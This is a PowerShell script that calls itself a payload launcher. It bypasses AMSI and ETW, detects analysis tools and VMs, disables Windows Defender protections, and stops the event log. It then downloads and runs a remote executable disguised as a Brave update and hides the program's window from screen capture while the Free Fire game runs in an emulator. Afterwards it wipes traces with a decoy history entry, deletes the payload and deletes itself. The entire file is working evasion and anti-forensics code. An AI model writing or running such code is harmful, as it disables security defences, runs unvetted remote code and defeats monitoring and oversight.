    Payload launcher — visible window, invisible on screenshare

#Requires -RunAsAdministrator

# ========== AMSI + ETW BYPASS ==========
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
$t=[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
if($t){
    $f=$t.GetField('etwProvider','NonPublic,Static')
    if($f){
        $p=$f.GetValue($null)
        if($p){
            $p.GetType().GetField('m_enabled','NonPublic,Instance').SetValue($p,0)
        }
    }
}

# ========== LOAD WIN32 API ==========
Add-Type -Name Native -Namespace Win -MemberDefinition @'
[DllImport("user32.dll")]
public static extern bool SetWindowDisplayAffinity(IntPtr hWnd, uint dwAffinity);

[DllImport("user32.dll")]
public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);

[DllImport("user32.dll")]
public static extern int GetWindowLong(IntPtr hWnd, int nIndex);

[DllImport("user32.dll")]
public static extern bool EnumWindows(EnumWindowProc lpEnumFunc, IntPtr lParam);

[DllImport("user32.dll", CharSet = CharSet.Auto)]
public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder lpString, int nMaxCount);

[DllImport("user32.dll")]
public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

[DllImport("kernel32.dll")]
public static extern IntPtr GetConsoleWindow();

public delegate bool EnumWindowProc(IntPtr hWnd, IntPtr lParam);

public const uint WDA_EXCLUDEFROMCAPTURE = 0x00000011;
public const int GWL_EXSTYLE = -20;
public const int WS_EX_TOOLWINDOW = 0x00000080;
'@

# ========== APPLY SCREENSHARE EXCLUSION TO THIS CONSOLE ==========
$hWnd = [Win.Native]::GetConsoleWindow()
[Win.Native]::SetWindowDisplayAffinity($hWnd, [Win.Native]::WDA_EXCLUDEFROMCAPTURE) | Out-Null
$exStyle = [Win.Native]::GetWindowLong($hWnd, [Win.Native]::GWL_EXSTYLE)
[Win.Native]::SetWindowLong($hWnd, [Win.Native]::GWL_EXSTYLE, $exStyle -bor [Win.Native]::WS_EX_TOOLWINDOW) | Out-Null

Write-Host "  ╔══════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "  ║     SCREENSHARE EXCLUSION ACTIVE                 ║" -ForegroundColor Cyan
Write-Host "  ╚══════════════════════════════════════════════════╝" -ForegroundColor Cyan

# ========== ANTI-ANALYSIS ==========
if ([System.Diagnostics.Debugger]::IsAttached) { exit }
foreach ($tool in @('procexp','wireshark','ida','ollydbg','x64dbg','dnspy','processhacker')) {
    if (Get-Process $tool -EA 0) { exit }
}
if (Get-Process 'vboxservice','vmtoolsd' -EA 0) { exit }

# ========== DEFENDER EXCLUSIONS ==========
Write-Host "[*] Adding exclusions..." -ForegroundColor Cyan
@("C:\Users\billa\Desktop","C:\","$env:TEMP","$env:WINDIR\Temp") | ForEach-Object {
    try { Add-MpPreference -ExclusionPath $_ -EA Stop } catch {}
}
try { Add-MpPreference -ExclusionProcess "powershell.exe" -EA Stop } catch {}

# ========== DISABLE DEFENDER ==========
$origRealtime   = (Get-MpPreference).DisableRealtimeMonitoring
$origBehavior   = (Get-MpPreference).DisableBehaviorMonitoring
$origScriptScan = (Get-MpPreference).DisableScriptScanning
$origIOAV       = (Get-MpPreference).DisableIOAVProtection
Set-MpPreference -DisableRealtimeMonitoring $true -EA 0
Set-MpPreference -DisableBehaviorMonitoring $true -EA 0
Set-MpPreference -DisableScriptScanning $true -EA 0
Set-MpPreference -DisableIOAVProtection $true -EA 0
Set-MpPreference -AttackSurfaceReductionRules_Ids "5BEB7EFE-FD9A-4556-801D-275E5FFC04CC" -AttackSurfaceReductionRules_Actions Disabled -EA 0

net stop eventlog /y 2>$null

# ========== LAUNCH EMULATOR ==========
Write-Host "[*] Checking HD-Player.exe..." -ForegroundColor Cyan
$emuProcess = Get-Process -Name "HD-Player" -EA 0
if (-not $emuProcess) {
    Write-Host "[*] Starting emulator..." -ForegroundColor Yellow
    $emuPaths = @(
        "C:\Program Files\BlueStacks_nxt\HD-Player.exe",
        "C:\Program Files\BlueStacks_msi2\HD-Player.exe",
        "C:\Program Files (x86)\BlueStacks\HD-Player.exe",
        "C:\Program Files\BlueStacks_msi5\HD-Player.exe"
    )
    $emuExe = $emuPaths | Where-Object { Test-Path $_ } | Select-Object -First 1
    if (-not $emuExe) { Write-Host "[-] HD-Player.exe not found" -ForegroundColor Red; Read-Host; exit }
    
    $instance = "Pie64"
    $package = "com.dts.freefireth"
    Start-Process $emuExe -ArgumentList "--instance $instance --cmd launchApp --package `"$package`" --source desktop_shortcut"
    Write-Host "[+] Emulator launching. Waiting 15s..." -ForegroundColor Green
    Start-Sleep 15
}

# ================================================================
# PAYLOAD: DOWNLOAD, SAVE TO DISK, LAUNCH AS VISIBLE WINDOW
# ================================================================
Write-Host "[*] Downloading payload..." -ForegroundColor Cyan

$payloadUrl = 'https://raw.githubusercontent.com/billa9889/wekk/main/Brave%20Update%20Handler.exe'
$payloadPath = "$env:TEMP\BraveUpdateHandler.exe"

try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($payloadUrl, $payloadPath)
    Write-Host "[+] Payload downloaded to: $payloadPath" -ForegroundColor Green
} catch {
    Write-Host "[-] Download failed: $_" -ForegroundColor Red
    Read-Host "Press Enter"
    exit
}

# ========== LAUNCH PAYLOAD AS VISIBLE WINDOW ==========
Write-Host "[*] Launching payload..." -ForegroundColor Cyan
$payloadProcess = Start-Process -FilePath $payloadPath -WindowStyle Normal -PassThru

Write-Host "[+] Payload launched. PID: $($payloadProcess.Id)" -ForegroundColor Green

# ========== APPLY SCREENSHARE EXCLUSION TO PAYLOAD WINDOW ==========
Write-Host "[*] Applying screenshare exclusion to payload window..." -ForegroundColor Cyan
Start-Sleep 3

# Enumerate all windows to find ours
$foundWindow = $false
$callback = [Win.Native+EnumWindowProc]{
    param($hWnd, $lParam)
    
    $sb = New-Object System.Text.StringBuilder 256
    [Win.Native]::GetWindowText($hWnd, $sb, $sb.Capacity)
    $title = $sb.ToString()
    
    $pid = 0
    [Win.Native]::GetWindowThreadProcessId($hWnd, [ref]$pid)
    
    if ($pid -eq $lParam -and -not [string]::IsNullOrWhiteSpace($title)) {
        # Apply screenshare exclusion to this window
        [Win.Native]::SetWindowDisplayAffinity($hWnd, [Win.Native]::WDA_EXCLUDEFROMCAPTURE) | Out-Null
        Write-Host "[+] Screenshare exclusion applied to: '$title' (PID: $pid)" -ForegroundColor Green
        return $false  # Stop enumerating
    }
    return $true
}

# Search for the payload window
[System.Runtime.InteropServices.GCHandle]::Alloc($callback)
try {
    [Win.Native]::EnumWindows($callback, $payloadProcess.Id)
} catch {
    Write-Host "[-] Could not find payload window for screenshare exclusion" -ForegroundColor Yellow
}

# ========== WAIT FOR HD-PLAYER TO EXIT ==========
Write-Host "[*] Waiting for HD-Player.exe to exit..." -ForegroundColor Cyan
while (Get-Process -Name "HD-Player" -EA 0) {
    Start-Sleep -Seconds (Get-Random -Min 1 -Max 4)
}
Write-Host "[+] HD-Player exited." -ForegroundColor Green

# ========== WAIT THEN KILL PAYLOAD ==========
Start-Sleep 10
try { Stop-Process -Id $payloadProcess.Id -Force -EA 0 } catch {}

# ========== CLEANUP ==========
# Overwrite history
$historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
$null = New-Item -ItemType Directory -Path (Split-Path $historyPath -Parent) -Force
Set-Content -Path $historyPath -Value "# PC Optimizer ran successfully" -Encoding UTF8

# Memory scrub
$memApi = Add-Type -MemberDefinition '[DllImport("kernel32.dll")] public static extern bool EmptyWorkingSet(IntPtr hProcess);' -Name "Mem$(Get-Random -Max 9999)" -Namespace "Mem" -PassThru -EA 0
if ($memApi) {
    Get-Process | ForEach-Object { try { $memApi::EmptyWorkingSet($_.Handle) } catch {} }
    [System.GC]::Collect(); [System.GC]::WaitForPendingFinalizers()
    [System.GC]::Collect(); [System.GC]::Collect()
}

# Remove payload from disk
Remove-Item $payloadPath -Force -EA 0

# Remove exclusions
@("C:\","C:\Users\billa\Desktop","$env:TEMP","$env:WINDIR\Temp") | ForEach-Object {
    try { Remove-MpPreference -ExclusionPath $_ -EA Stop } catch {}
}
try { Remove-MpPreference -ExclusionProcess "powershell.exe" -EA Stop } catch {}

# Restore Defender
try { Set-MpPreference -DisableRealtimeMonitoring $origRealtime -EA Stop } catch {}
try { Set-MpPreference -DisableBehaviorMonitoring $origBehavior -EA Stop } catch {}
try { Set-MpPreference -DisableScriptScanning $origScriptScan -EA Stop } catch {}
try { Set-MpPreference -DisableIOAVProtection $origIOAV -EA Stop } catch {}
try { Set-MpPreference -AttackSurfaceReductionRules_Ids "5BEB7EFE-FD9A-4556-801D-275E5FFC04CC" -AttackSurfaceReductionRules_Actions Enabled -EA Stop } catch {}

net start eventlog 2>$null

Write-Host "[+] Complete." -ForegroundColor Green
Start-Sleep 3

# Self-delete
try { cmd /c "del /f /q `"$PSCommandPath`"" 2>$null } catch {}
Stop-Process -Id $pid -Force
